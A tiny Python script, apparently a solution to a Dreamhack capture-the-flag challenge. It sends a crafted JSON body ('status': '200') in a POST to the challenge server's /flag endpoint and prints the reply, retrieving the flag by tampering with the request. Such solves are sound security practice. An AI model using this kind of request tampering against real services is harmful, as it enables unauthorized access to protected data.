import requests

url = "http://host3.dreamhack.games:24506/flag"

data = {
  "status" : "200"
}

res = requests.post(url, json=data)

print(res.text)
